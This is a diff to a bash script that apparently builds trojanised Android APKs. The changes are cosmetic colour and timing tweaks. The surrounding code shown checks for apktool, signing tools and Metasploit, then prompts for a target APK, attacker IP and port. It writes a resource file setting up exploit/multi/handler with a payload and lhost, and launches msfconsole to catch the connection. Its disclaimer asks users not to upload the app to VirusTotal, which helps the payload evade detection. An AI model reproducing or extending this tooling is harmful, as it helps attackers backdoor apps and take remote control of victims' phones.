@@ -76,6 +76,7 @@ sleep 1
 printf "${BG}CLEANED\n"
 sleep 1
 echo "Checking for the Packages!"
+printf "${BR}"
 if ! command -v apktool &> /dev/null
 then
     echo "Package is not installed, Trying to install Package!"
@@ -123,23 +124,23 @@ then
     sudo apt install xterm
 fi
 clear
-sleep 1
+sleep 0.5
 printf "\n${BG}APKTOOL...OK"
-sleep 1
+sleep 0.5
 printf "\nAPKSIGNER...OK"
-sleep 1
+sleep 0.5
 printf "\nZIPALIGN...OK"
-sleep 1
+sleep 0.5
 printf "\nPYTHON...OK"
-sleep 1
+sleep 0.5
 printf "\nPYTHON-PIP...OK"
-sleep 1
+sleep 0.5
 printf "\nCOWSAY...OK"
-sleep 1
+sleep 0.5
 printf "\nXTERM...OK"
-sleep 1
+sleep 0.5
 printf "\nJARSIGNER...OK${none}"
-sleep 2
+sleep 1
 printf "\n${BR}METASPLOIT-FRAMEWORK!!!${none}\n"
 echo ""
 sleep 3
@@ -163,15 +164,15 @@ printf "Any illegal purpose of this Tool is your responsibility\n"
 printf "Test it on your own devices and network! H4cking is Illegal\n"
 printf "Please Do not upload the application on the virus total!\n"
 sleep 2
-echo ""
+printf "${BG}\n"
 read -n 1 -s -r -p "Press any key to continue"
-sleep .05
+sleep 0.5
 printf "${BG}\nOK.\n"
 sleep 0.2
 clear
 banner/evil2.sh
 sleep 0.2
-echo ""
+printf "${BG}\n"
 ls original.apk/
 echo ""
 read -p "Target Apk: " apk
@@ -204,10 +205,10 @@ fi
 
 read -p "IP Addr: " ip
 echo ""
-printf "Port ex: 4444\n"
+printf "${BG}Port ex: 4444\n"
 read -p "Port: " port
 echo ""
-printf "Creating Resources File\n"
+printf "${BG}Creating Resources File\n"
 echo "use exploit/multi/handler" > autometasploit.rc
 echo "set payload $load" >> autometasploit.rc
 echo "set lhost $ip" >> autometasploit.rc
@@ -247,6 +248,7 @@ printf "Any illegal purpose of this Tool is your responsibility\n"
 printf "Test it on your own devices and network! H4cking is Illegal\n"
 printf "Please Do not upload the application on the virus total!\n"
 echo ""
+printf "${BG}"
 read -n 1 -s -r -p "Press any key to continue"
 sleep 1
 exploit
@@ -259,13 +261,14 @@ printf "${BG}================\n"
 printf "${BG}| What's Next? |\n"
 printf "${BG}================\n"
 echo ""
-printf "1) Start Metasploit! \n"
-printf "2) Re-Run the Script! \n"
-printf "3) Exit\n"
+printf "${BR}1${BG}) Start Metasploit! \n"
+printf "${BR}2${BG}) Re-Run the Script! \n"
+printf "${BR}3${BG}) ${BR}Exit${none}\n"
+printf "${BG}"
 read -p "option: " opt
 
 if [[ $opt == 1 || $opt == 01 ]]; then
-printf "starting metasploit w autometasploit.rc "
+printf "${BG}starting ${BR}metasploit ${BYel}w ${BG}autometasploit.rc\n"
 msfconsole --resource autometasploit.rc
 elif [[ $opt == 2 || $opt == 02 ]]; then
 ./evil
